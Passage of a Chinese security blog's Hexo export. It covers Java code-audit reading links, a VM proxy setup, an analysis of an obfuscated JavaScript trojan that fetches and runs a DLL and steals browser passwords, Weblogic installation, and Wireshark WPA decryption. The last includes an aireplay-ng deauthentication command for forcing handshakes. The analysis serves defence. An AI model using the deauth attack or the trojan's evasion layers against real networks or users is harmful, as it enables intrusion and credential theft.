<li><a href="https://www.secpulse.com/archives/54652.html" target="_blank" rel="noopener">谈一谈java代码审计—安全小课堂第四十一期</a></li>
<li><a href="https://blog.csdn.net/jameson_/article/details/73111402" target="_blank" rel="noopener">Java代码审计之文件包含</a></li>
</ul>
<h3 id="Java代码审计实际案例"><a href="#Java代码审计实际案例" class="headerlink" title="Java代码审计实际案例"></a>Java代码审计实际案例</h3><ul>
<li><a href="http://www.freebuf.com/articles/web/162910.html" target="_blank" rel="noopener">某租车系统JAVA代码审计</a></li>
<li><a href="https://paper.tuisec.win/detail/98751f3fb2340b7" target="_blank" rel="noopener">Java代码审计-铁人下载系统</a></li>
<li><a href="http://www.codersec.net/2016/12/%E9%93%81%E4%BA%BA%E4%B8%8B%E8%BD%BD%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" target="_blank" rel="noopener">铁人下载系统代码审计</a></li>
<li><a href="http://www.zhutougg.com/2018/03/05/java-eedai-ma-shen-ji-shi-li-ji-lou-dong-xiu-fu/" target="_blank" rel="noopener">Java EE代码审计实例及漏洞修复</a></li>
<li><a href="http://foreversong.cn/archives/1033" target="_blank" rel="noopener">JAVA代码审计之团队CMS v1.0</a></li>
<li><a href="https://xianzhi.aliyun.com/forum/topic/2174" target="_blank" rel="noopener">某 Java 急速开发框架分析与挖掘</a></li>
<li><a href="https://mp.weixin.qq.com/s/WT1EXEryUGGqHQpSi959xw" target="_blank" rel="noopener">精品漏洞第4弹——层层放大java审计的攻击面</a></li>
<li><a href="https://www.secpulse.com/archives/27705.html" target="_blank" rel="noopener">JEECMS|JEEBBS|JSPGOU 前台getshell(高危)</a></li>
<li><a href="https://www.secpulse.com/archives/47545.html" target="_blank" rel="noopener">Live800在线客服系统SQL注射/未授权查看对话记录</a></li>
<li><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2016-0177183.html?_360safeparam=25046958" target="_blank" rel="noopener">Live800在线客服系统默认密码导致的SQL查询/SQL注射漏洞</a></li>
<li><a href="http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2015-0147322" target="_blank" rel="noopener">live800客服系统任意文件下载漏洞</a></li>
<li><a href="http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2015-0147511" target="_blank" rel="noopener">live800在线客服系统SQL注射漏洞</a></li>
<li><a href="https://www.seebug.org/vuldb/ssvid-89306" target="_blank" rel="noopener">Enorth Webpublisher CMS SQL Injection from delete_pending_news.jsp</a></li>
<li>​</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Java代码审计 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux虚拟机使用主机shadowsocks代理上网]]></title>
      <url>//blog/1520349399715.html</url>
      <content type="html"><![CDATA[<p>无意中发现虚拟机也能通过shadowsocks代理上网，而且非常方便，尝试了一波<br><a id="more"></a></p>
<h3 id="0x01-查看本机IP"><a href="#0x01-查看本机IP" class="headerlink" title="0x01 查看本机IP"></a>0x01 查看本机IP</h3><p><code>ipconfig</code>,找到主机的IP<br><img src="http://x-f1v3.github.io/images/1520350003892.png" alt="image"><br>我这里使用的wifi，所以显示的是局域网地址，总之，能<code>ping</code>通就行。</p>
<h3 id="0x02-查看SS本地端口"><a href="#0x02-查看SS本地端口" class="headerlink" title="0x02 查看SS本地端口"></a>0x02 查看SS本地端口</h3><p>接下来就是连上SS，然后查看本地端口（默认是1080），我这里是<code>1081</code><br><img src="http://x-f1v3.github.io/images/1520351125422.png" alt="image"></p>
<h3 id="0x03-允许SS来自局域网的连接"><a href="#0x03-允许SS来自局域网的连接" class="headerlink" title="0x03  允许SS来自局域网的连接"></a>0x03  允许SS来自局域网的连接</h3><p><img src="http://x-f1v3.github.io/images/1520351208941.png" alt="image"></p>
<h3 id="0x04-虚拟机设成NAT模式"><a href="#0x04-虚拟机设成NAT模式" class="headerlink" title="0x04 虚拟机设成NAT模式"></a>0x04 虚拟机设成NAT模式</h3><p><img src="http://x-f1v3.github.io/images/1520351381763.png" alt="image"></p>
<h3 id="0x05-进入系统设置代理"><a href="#0x05-进入系统设置代理" class="headerlink" title="0x05 进入系统设置代理"></a>0x05 进入系统设置代理</h3><p><img src="http://x-f1v3.github.io/images/1520351509007.png" alt="image"></p>
<h3 id="0x06-成功代理"><a href="#0x06-成功代理" class="headerlink" title="0x06 成功代理"></a>0x06 成功代理</h3><p><img src="http://x-f1v3.github.io/images/1520351585870.png" alt="image"></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
<li><a href="http://blog.csdn.net/zzl1243976730/article/details/63695131" target="_blank" rel="noopener">http://blog.csdn.net/zzl1243976730/article/details/63695131</a></li>
<li><a href="http://blog.csdn.net/u010726042/article/details/53187937" target="_blank" rel="noopener">http://blog.csdn.net/u010726042/article/details/53187937</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 日常姿势 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[记一次JS木马分析]]></title>
      <url>//blog/1514542114971.html</url>
      <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>　　随着 <code>javascript</code> 这类脚本语言的快速发展，它能展现的内容越来越多样，所运用的功能变得越来越强大。当运用在 <code>web</code> 开发上时，增加了更多的动态功能和效果，极大的改善了用户体验。但是，随着 <code>js</code> 的功能强大的同时，也带来了更多的安全隐患。由于 <code>js</code> 的混淆效果多样，常见的有 <code>YUI Compressor</code>、<code>Google Closure Compiler</code>、<code>UglifyJS</code>。更有 <code>jsfuck</code> 这种比较奇葩的加密方式。使得让软件自动的识别特征码，查杀 <code>js</code> 恶意代码变的非常困难。对 <code>JavaScript</code> 恶意代码的检测已成为 <code>Web</code> 信息安全领域一个亟待解决的问题。<br>　　因为近期偶然发现一个 <code>js</code> 木马文件，所以想探寻一下 <code>js</code> 木马的混淆方法和这个木马起的作用。<br><a id="more"></a></p>
<h3 id="0x01-解混淆"><a href="#0x01-解混淆" class="headerlink" title="0x01 解混淆"></a>0x01 解混淆</h3><p>　　首先打开 <code>js</code> 文件，看到的就是一个很明显的 <code>var PAa = &quot;&quot;;</code> 定义了一个变量，然后是大段的代码：<img src="http://image.3001.net/images/20171215/15133070905422.jpg" alt="img"></p>
<p>　　这大段的代码都是以函数执行的方式放在数组里的，我们在仔细看一下数组第一个元素：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(function f000()&#123;return &quot;Sq&quot;;&#125;)()</span><br></pre></td></tr></table></figure>
<p>　　发现，这数组的第一个元素其实就是字符串 <code>Sq</code>,但是是以函数执行后返回的结果显示的，其他数组元素也是这样的。非常的巧妙，等于加了一层壳，防止被跟踪查杀。</p>
<p>　　接着我们看到最后：</p>
<p><img src="http://image.3001.net/images/20171215/151330724114.jpg" alt="img"></p>
<p>　　发现，又定义了一个字典，然后对中间数组元素进行对照替换处理，得到真正的字符，而且这个字符也不是真正的字符，而是以 16 进制的形式表示的。然后拼接到开始定义的 <code>PAa</code> 这个变量中，最后 <code>eval</code> 执行这段代码，那毫无疑问，最后 <code>PAa</code> 这个变量存储的东西就是真正的代码了。</p>
<p>　　在这里，就可以用 <code>document.write()</code> 来直接输出 <code>PAa</code> 这个变量的内容，也就是明文代码了。</p>
<p>　　这第一层的混淆，相当于对代码进行”加壳”处理，通过函数，数组，字典、16进制等方式进行层层替换，最后才得出代码。</p>
<h3 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h3><p>　　对于输出的代码，在进行美化和调整一下格式，终于达到人能理解的程度了。但是代码还是有第二层的混淆，不过这层的混淆就是些字符串的拼接与组合，已达到骗过机器追踪关键字的目的，从而达到免杀的效果。但对人来说，还是可以判断分析出来的：</p>
<p><img src="http://image.3001.net/images/20171215/15133077756072.jpg" alt="img"></p>
<p>　　下面就来分析一下，这个木马到底做了哪些操作。</p>
<h4 id="判断cmd-exe的路径"><a href="#判断cmd-exe的路径" class="headerlink" title="判断cmd.exe的路径"></a>判断cmd.exe的路径</h4><p>　　代码开始就是执行了一个函数：</p>
<p><img src="http://image.3001.net/images/20171215/15133077711467.jpg" alt="img"></p>
<p>　　可以看到，在这里也是对字符进行拼接，最后凑出来的关键字。 这个函数的大概意思就是通过创建  <code>WScript.Shell</code> 对象来查看环境变量中的 <code>COMSPEC</code> 值，这个值是返回命令行解释器可执行程序的准确路径，就是 <code>cmd.exe</code> 的路径。然后与系统目录下的 <code>system32\cmd.exe</code> 进行比较。判断 <code>cmd.exe</code> 的路径。</p>
<h4 id="扩展与查看环境变量"><a href="#扩展与查看环境变量" class="headerlink" title="扩展与查看环境变量"></a>扩展与查看环境变量</h4><p><img src="http://image.3001.net/images/20171215/15133077754683.jpg" alt="img"></p>
<p>　　这里，也是经过一连串的字符的替换与拼接，大致还原出原来的样子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Za3 + OHb + PVg7 + Tp7 + QRn4  表示  CreateObject</span><br><span class="line">OEl7 + Pa + Eu  表示  WScript.Shell</span><br><span class="line">Js9 + Vh + PVx + COb3 表示 %TEMP%/</span><br></pre></td></tr></table></figure>
<p>这里的意思就是通过扩充环境字串 <code>%TEMP%/</code>，并在该目录下，创建出一串无意义名字的后缀为 <code>dll</code> 的字符串，即 <code>xx.dll</code> 赋值于 <code>GLq</code> 这个变量中，为后面的写文件做铺垫，继续看下去：</p>
<p><img src="http://image.3001.net/images/20171215/15133077728391.jpg" alt="img"></p>
<p>　　接下来，就是查看环境变量中的 <code>PROCESSOR_ARCHITECTUREiD</code>，来判断系统是 64，还是 32 位，最后选择相对应的 <code>rundll32.exe</code>，用于后面执行恶意动态链接库的函数。其中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cc5 + TXr9 + HUf + YEn7 + Ci5 + SDb9 表示 PROCESSOR_ARCHITECTURE</span><br><span class="line">Vg  表示 &quot;%SystemRoot%\\system32\\rundll32.exe&quot; + &quot;&quot;</span><br><span class="line">ZPt 表示  &quot;%SystemRoot%\\SysWOW64\\rundll32.exe&quot; + &quot;&quot;</span><br></pre></td></tr></table></figure>
<h4 id="下载恶意文件"><a href="#下载恶意文件" class="headerlink" title="下载恶意文件"></a>下载恶意文件</h4><p><img src="http://image.3001.net/images/20171215/15133077748992.jpg" alt="img"></p>
<p>　　创建 <code>http</code> 请求对象，其中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Zm6 表示 [MSXML2.XMLHTTP,WinHttp.WinHttpRequest.5.1]</span><br></pre></td></tr></table></figure>
<p>　　这 2 个都是能实现 <code>HTTP</code> 请求响应的组件，这里是尝试创建这其中任意一个组件对象。</p>
<p>　　紧接着，就是判断在 <code>%TEMP%/</code> 是否已有 <code>xx.dll</code> ，即是否已经被攻击，如果没有的话，就继续执行下去，也就是访问恶意网站，下载要在计算机上执行的恶意文件，并放在 <code>%TEMP%/</code> 目录下的临时文件中,当然文本也是加密处理的:</p>
<p><img src="http://image.3001.net/images/20171215/15133077725499.jpg" alt="img"></p>
<h4 id="解密并校验恶意文件"><a href="#解密并校验恶意文件" class="headerlink" title="解密并校验恶意文件"></a>解密并校验恶意文件</h4><p>　　存放临时文件后，因为文件内容也是经过混淆处理的，所以要重新从文件中取出内容进行处理与校验。我们来看下关键函数 <code>IGi2</code> 函数。</p>
<p><img src="http://image.3001.net/images/20171215/15133077756386.jpg" alt="img"></p>
<p><img src="http://image.3001.net/images/20171215/15133077738951.jpg" alt="img"></p>
<p>　　可以看到，主要的方法就是通过字符的 <code>unicode</code> 编码，针对恶意文本的一些特定字符的 <code>unicode</code> 编码进行替换。但是还没完，还有一个步骤：</p>
<p><img src="http://image.3001.net/images/20171215/15133129695110.jpg" alt="img"></p>
<p>　　对所有的数字进行异或运算。在最后，还要通过一系列特定的计算，与后四位的标志位进行比较，进行文本内容的校验，来判断该文本是否被修改，或者是内容不全。</p>
<p>　　之后，还加上了一层保险，就是判断整个恶意文件的字符数，保证是在一定的区间内。</p>
<p><img src="http://image.3001.net/images/20171215/15133077725586.jpg" alt="img"></p>
<h4 id="执行恶意文件代码"><a href="#执行恶意文件代码" class="headerlink" title="执行恶意文件代码"></a>执行恶意文件代码</h4><p>　　最后，在判断过字符个数，没问题之后，就直接写入 <code>dll</code> 文件，准备执行了，如上图。</p>
<p>　　但是我们知道，要写入文本的字符串现在还都是 <code>unicode</code> 编码的，所以需要还原成真正的字符串才行，这里是通过 <code>St</code> 函数。而这个 <code>St</code> 函数和上面的 <code>IGi2</code> 函数的作用是一样的，只不过数组是反的，这也是我疑惑的地方，它的作用就是把之前替换掉的数字替换回来，然后进行全部的 <code>unicode</code> 解码，变成字符串。至于为什么要把替换掉的字符换回来？由于恶意网站已无法访问，所以拿不到下载的恶意文本，是注释？还是另一层混淆？这点就无法判断了，也是非常的遗憾。</p>
<p><img src="http://image.3001.net/images/20171215/15133077721438.jpg" alt="img"></p>
<p>　　在写入文件之后，就通过命令 <code>Rundll32.exe DLLname,Functionname [Arguments]</code> 的形式运行 <code>dll</code> 文件里的函数了。</p>
<h3 id="0x03-免杀方式总结"><a href="#0x03-免杀方式总结" class="headerlink" title="0x03 免杀方式总结"></a>0x03 免杀方式总结</h3><p>　　<code>js</code> 的混淆能力真的很强大，简单总结一下上面木马的混淆免杀方式，第一层混淆就是通过了函数返回值，数组，字典、16 进制表示字符等方式进行层层替换，得到真正的代码。第二层混淆就是在代码执行过程中对关键字进行字符串的拼接，躲避对关键字的查杀，简单而有效。第三层混淆就是通过 <code>unicode</code> 编码，利用特定数值替换，然后通过异或等数学方法得到代码明文，对下载的恶意文件中的字符进行解密操作。整个过程体现了对普通杀毒软件的极强的欺骗性和防御性。</p>
<h3 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h3><p>　　由于找不到下载到本地的恶意代码文本，特意到网上搜了N个该 <code>JS</code> 的特征代码。最后终于发现了在国外的一个网站上发现了对类似 <code>JS</code> 执行的内存和行为分析，虽然还是没有下载的恶意代码文本，但是已经能够大致确定该 <code>JS</code>下载的恶意代码的作用了。地址</p>
<blockquote>
<p><a href="https://www.hybrid-analysis.com/sample/d8f738474e7c4251132059375b3716fdf21e87823f5890a918dfb70a4d164066?environmentId=100" target="_blank" rel="noopener">https://www.hybrid-analysis.com/sample/d8f738474e7c4251132059375b3716fdf21e87823f5890a918dfb70a4d164066?environmentId=100</a></p>
</blockquote>
<p>　　从上面找到了 <code>JS</code> 代码，发现和我们分析的样本的第一层混淆方式略有不同:<img src="http://image.3001.net/images/20171215/15133077742262.jpg" alt="img"></p>
<p>　　但是同样经过了最开始的还原之后，发现核心代码和分析样本代码基本一致:</p>
<p><img src="http://image.3001.net/images/20171215/15133131646109.jpg" alt="img"></p>
<p>　　最后来看下，该 <code>JS</code> 下载的恶意代码究竟干了什么:</p>
<p><img src="http://image.3001.net/images/20171215/15133077738626.jpg" alt="img"></p>
<p>　　大概意思就是该恶意文件会从本地浏览器窃取信息，如平时让浏览器记住的账号密码，然后查找电脑账户名称，计算机名，计算机组名ID等。</p>
<p>　　也可以从行为分析的角度再次验证 <code>JS</code> 执行过程，因为上面是从代码角度分析的，难免有点点抽象，从 <code>JS</code> 实际操作过程分析，会更加的直观。我们可以看到：</p>
<p><img src="http://image.3001.net/images/20171215/15133077739233.jpg" alt="img"><br><img src="http://image.3001.net/images/20171215/15133077723715.jpg" alt="img"></p>
<p>　　发现与分析基本一致。</p>
]]></content>
      
        <categories>
            
            <category> 木马分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JS </tag>
            
            <tag> 木马 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Centos搭建Weblogic容器]]></title>
      <url>//blog/1511748171281.html</url>
      <content type="html"><![CDATA[<p>Centos搭建Weblogic容器<br><a id="more"></a></p>
<h3 id="安装JDK"><a href="#安装JDK" class="headerlink" title="安装JDK"></a>安装JDK</h3><p>安装前需要先卸载Centos自带的OpenJDK，然后安装新的JDK。</p>
<p>下载地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</span><br></pre></td></tr></table></figure></p>
<p>卸载OpenJDK<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep java</span><br><span class="line"></span><br><span class="line">然后把带有OpenJDK的删除，如</span><br><span class="line">yum -y remove java-1.7.0-openjdk ...</span><br></pre></td></tr></table></figure></p>
<p>安装下载的JDK<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -ivh /tmp/jdk-8u45-linux-x64.rpm</span><br></pre></td></tr></table></figure></p>
<p>JDK安装路径为<code>/usr/java</code></p>
<p>设置环境变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line">加入：</span><br><span class="line">JAVA_HOME=/usr/java/jdk1.8.0_45</span><br><span class="line">JRE_HOME=/usr/java/jdk1.8.0_45/jre</span><br><span class="line">PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin</span><br><span class="line">export JAVA_HOME JRE_HOME PATH CLASSPATH</span><br></pre></td></tr></table></figure></p>
<p>使设置生效<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure></p>
<p>参考</p>
<blockquote>
</blockquote>
<p><a href="http://www.live-in.org/archives/2486.html" target="_blank" rel="noopener">http://www.live-in.org/archives/2486.html</a><br><a href="http://blog.csdn.net/duguduchong/article/details/8816371" target="_blank" rel="noopener">http://blog.csdn.net/duguduchong/article/details/8816371</a></p>
<h3 id="安装Weblogic容器"><a href="#安装Weblogic容器" class="headerlink" title="安装Weblogic容器"></a>安装Weblogic容器</h3><p>下载地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.oracle.com/technetwork/cn/middleware/ias/downloads/wls-main-091116-zhs.html</span><br></pre></td></tr></table></figure></p>
<p>具体的安装过程，也是网上有的，亲测可用。</p>
<p>参考</p>
<blockquote>
<p><a href="http://www.live-in.org/archives/2491.html" target="_blank" rel="noopener">http://www.live-in.org/archives/2491.html</a></p>
</blockquote>
<p>具体的命令行安装还可以参考</p>
<blockquote>
</blockquote>
<p><a href="http://linux.it.net.cn/CentOS/course/2017/0827/27158.html" target="_blank" rel="noopener">http://linux.it.net.cn/CentOS/course/2017/0827/27158.html</a></p>
]]></content>
      
        <categories>
            
            <category> 系统环境 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Centos </tag>
            
            <tag> Weblogic </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[用Wireshark解密无线网络数据包]]></title>
      <url>//blog/%E7%94%A8Wireshark%E8%A7%A3%E5%AF%86%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%8C%85.html</url>
      <content type="html"><![CDATA[<p>当知道WIFI密码时，不需要直接连接WIFI，就可以抓取数据包<br><a id="more"></a></p>
<h3 id="抓取数据包"><a href="#抓取数据包" class="headerlink" title="抓取数据包"></a>抓取数据包</h3><p>开启网卡的监听模式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure></p>
<p><img src="http://x-f1v3.github.io/images/1507603437995.png" alt="image"></p>
<p>抓取指定AP的网络数据包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 11 -w xyw --bssid 36:DE:1A:98:F6:2A wlan0mon --output-format pcap</span><br></pre></td></tr></table></figure></p>
<p>这里<code>--output-format</code>是输出文件的文件格式<br><img src="http://x-f1v3.github.io/images/1507603809852.png" alt="image"></p>
<p><strong> 需要注意是，在抓的包中必须要有握手包，可以慢慢等，也可以进行洪水攻击 </strong></p>
<p>使用洪水攻击使其掉线，然后抓握手包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 10 -a 36:DE:1A:98:F6:2A  -c 14:F6:5A:A1:37:97 wlan0mon</span><br></pre></td></tr></table></figure></p>
<p><img src="http://x-f1v3.github.io/images/1507604261098.png" alt="image"></p>
<p>再等上一段时间，就停止抓包。</p>
<h3 id="解密数据包"><a href="#解密数据包" class="headerlink" title="解密数据包"></a>解密数据包</h3><p>刚抓到的数据包用Wireshark打开的话，是看不到具体的东西的需要解密。</p>
<p>打开Wireshark后，先在<code>Edit-&gt;preference-&gt;protocols-&gt;IEEE 802.11</code>中启动<code>Enable decryption</code><br><img src="http://x-f1v3.github.io/images/1507604503916.png" alt="image"></p>
<p>然后点上<code>view-&gt;Wireless Toolbar</code>，就会在后面出现<code>Decryptions Keys</code><br><img src="http://x-f1v3.github.io/images/1507604713429.png" alt="image"></p>
<p>点击这个<code>Decryptions Keys</code>，输入密码和SSID，然后点击apply,ok<br><img src="http://x-f1v3.github.io/images/1507604764354.png" alt="image"></p>
<p>最后<code>view-&gt;reload</code>,就可以看到里面具体的数据了<br><img src="http://x-f1v3.github.io/images/1507604829814.png" alt="image"><br><img src="http://x-f1v3.github.io/images/1507604874447.png" alt="image"></p>
<h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><p>可以使用命令行直接解包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wireshark -r xyw-02.cap -o wlan.enable_decryption:TRUE -o wlan.wep_key1:wpa-pwd:12345678:xyw</span><br></pre></td></tr></table></figure></p>
<p><code>-r</code> 后面接要打开的数据包 <code>-o</code>参数是要改变preference里面的设置</p>
<p><strong> 不过这是早期版本的Wireshark可以用 ，较新的版本里都不能使用</strong></p>
<p>新版本可以试下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wireshark -r xyw-02.cap -o wlan.enable_decryption:TRUE -o &quot;uat:80211_keys:\&quot;wpa-pwd\&quot;,\&quot; 12345678:xyw\&quot;&quot;</span><br></pre></td></tr></table></figure></p>
<p>自己测试是成功的</p>
<p><img src="http://x-f1v3.github.io/images/1507612001366.png" alt="image"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="http://www.lovemytool.com/blog/2010/05/wireshark-and-tshark-decrypt-sample-capture-file-by-joke-snelders.html" target="_blank" rel="noopener">http://www.lovemytool.com/blog/2010/05/wireshark-and-tshark-decrypt-sample-capture-file-by-joke-snelders.html</a></li>
<li><a href="https://wiki.wireshark.org/HowToDecrypt802.11" target="_blank" rel="noopener">https://wiki.wireshark.org/HowToDecrypt802.11</a></li>
<li><a href="https://ask.wireshark.org/questions/24249/decrypt-wpa-with-tshark" target="_blank" rel="noopener">https://ask.wireshark.org/questions/24249/decrypt-wpa-with-tshark</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 无线 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Wireshark </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ERROR Deployer not found: git hexo d 报错]]></title>
      <url>//blog/1505536580617.html</url>
      <content type="html"><![CDATA[<p>刚搭建hexo的时候执行<code>hexo d</code>，总是会报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR Deployer not found: git</span><br></pre></td></tr></table></figure></p>
<a id="more"></a>
<p>网上查了之后，大多都说是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save </span><br><span class="line">重新 deploy 即可</span><br></pre></td></tr></table></figure></p>
<p>最后也是照做了，但是还是报同样的错误，最后想是把这些文件都给删了，重新来一次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init yourfolder</span><br><span class="line">cd yourfolder</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure></p>
<p>当然好了之后，就要修改自己的<code>_config.yml</code>文件，然后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure></p>
<p>居然莫名其妙的成功了，看来网上说的<code>npm install hexo-deployer-git --save</code> 也是正确方法，只不过，文件被我各种尝试给搞乱了，重新来一次就可以了。</p>
]]></content>
      
        <categories>
            
            <category> 解决报错 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
